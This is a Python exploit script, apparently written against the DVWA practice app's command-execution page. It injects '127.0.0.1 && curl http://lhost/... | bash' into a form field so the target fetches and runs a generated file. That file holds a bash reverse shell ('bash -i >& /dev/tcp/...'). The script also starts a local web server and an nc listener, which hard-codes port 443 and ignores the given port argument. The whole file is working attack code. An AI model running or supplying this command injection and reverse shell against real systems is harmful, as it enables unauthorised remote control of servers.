#!/usr/bin/python3
import requests, sys, os, subprocess

#Colors
green = "\033[1;32;40m"
red = "\033[1;31;40m"
reset_color = "\033[0m"

if len(sys.argv) != 5:
	exit(f"{green}[+] Usage: {sys.argv[0]} lhost lport rhost session_cookie{reset_color}")

#EXAMPLE
# python3 command_injection.py 192.168.56.21 443 http://192.168.56.13/vulnerabilities/exec/ hdd6nbffinh1uicmv5epkksht

#Global variables
lhost = sys.argv[1]
lport = sys.argv[2]
rhost = sys.argv[3]
session_cookie = sys.argv[4]

file_with_payload = "concha_reverse.sh"
cookie = {"PHPSESSID": session_cookie, "security": "low"}
#Data
data = {"ip": f"127.0.0.1 && curl http://{lhost}/{file_with_payload} | bash", "Submit": "Submit"}

def main():
	createPayload()
	setPythonWebServer()
	startNCListener()
	makeRequest()
	killPythonProcess()

def makeRequest():
	r = requests.post(rhost, data=data, cookies=cookie)		

def createPayload():
	payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
	f = open(file_with_payload, "w")
	f.write(payload)
	f.close()	

def startNCListener():
	cmd = "nc -lvp 443"
	subprocess.Popen(cmd, shell=True)

def setPythonWebServer():
	os.system("python3 -m http.server 80 &")

def killPythonProcess():
	os.system("kill -15 $(sudo lsof -i -n -P | grep -i python3 | awk '{print $2}')")

if __name__ == '__main__':
	main()

